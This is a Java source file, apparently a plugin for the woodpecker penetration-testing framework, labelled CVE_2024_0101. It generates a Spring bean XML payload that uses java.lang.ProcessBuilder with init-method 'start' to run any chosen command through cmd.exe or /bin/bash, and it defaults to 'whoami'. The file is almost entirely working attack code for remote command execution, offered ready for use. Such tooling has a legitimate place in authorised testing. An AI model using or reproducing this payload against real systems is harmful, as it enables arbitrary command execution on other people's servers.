package me.gv7.woodpecker.plugin.vuln.CVE_2024_0101;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.plugin.utils.WPSettings;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

/**
 * {@code PayloadGenerator}组件是woodpecker中用于生成漏洞载荷的组件
 *
 * <p>该组件的功能类似于{@code Helper}，但是{@code PayloadGenerator}通常是面向与生成特定的漏洞载荷，而{@code Helper}用于某些通用载荷的生成。
 */
public class XmlPayloadGenerator implements IPayloadGenerator {
    private IPluginHelper helper;

    public XmlPayloadGenerator(IPluginHelper helper) {
        this.helper = helper;
    }

    @Override
    public String getPayloadTabCaption() {
        return "SpringBean Exec";
    }

    /**
     * 设置生成漏洞载荷的一些必要的参数，如果不需要参数则直接返回 <u>null</u> 即可
     *
     * @return 返回利用所需的参数列表
     */
    @Override
    public IArgsUsageBinder getPayloadCustomArgs() {
        IArgsUsageBinder argsUsageBinder = helper.createArgsUsageBinder();
        List<IArg> argsList = new ArrayList<IArg>();

        IArg argOS = helper.createArg();
        argOS.setName("os_type");
        argOS.setRequired(true);
        argOS.setType(IArg.ARG_TYPE_ENUM);
        argOS.setEnumValue(new ArrayList<String>() {{
            add("windows");
            add("linux");
        }});
        argOS.setDefaultValue("windows");
        argsList.add(argOS);

        IArg argCommand = helper.createArg();
        argCommand.setName("command");
        argCommand.setRequired(true);
        argCommand.setDefaultValue("whoami");
        argsList.add(argCommand);

        argsUsageBinder.setArgsList(argsList);
        return argsUsageBinder;
    }

    public void generatorPayload(Map<String, Object> customArgs, IResultOutput iResultOutput) {
        WPSettings settings = new WPSettings(customArgs);
        String osType = settings.getString("os_type");
        String command = settings.getString("command");
        String xmlPoc = null;

        if (osType.equals("windows")) {
            xmlPoc = String.format("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                    "<beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
                    "  <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
                    "    <constructor-arg>\n" +
                    "      <list>\n" +
                    "        <value>cmd.exe</value>\n" +
                    "        <value>/c</value>\n" +
                    "        <value><![CDATA[%s]]></value>\n" +
                    "      </list>\n" +
                    "    </constructor-arg>\n" +
                    "  </bean>\n" +
                    "</beans>", command);

        } else if (osType.equals("linux")) {
            xmlPoc = String.format("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                    "<beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
                    "  <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
                    "    <constructor-arg>\n" +
                    "      <list>\n" +
                    "        <value>/bin/bash</value>\n" +
                    "        <value>-c</value>\n" +
                    "        <value><![CDATA[%s]]></value>\n" +
                    "      </list>\n" +
                    "    </constructor-arg>\n" +
                    "  </bean>\n" +
                    "</beans>", command);
        }

        iResultOutput.successPrintln(String.format("os type: [%s] command: [%s]", osType, command));
        iResultOutput.rawPrintln("\n");
        iResultOutput.rawPrintln(xmlPoc);
        iResultOutput.rawPrintln("\n");
    }
}
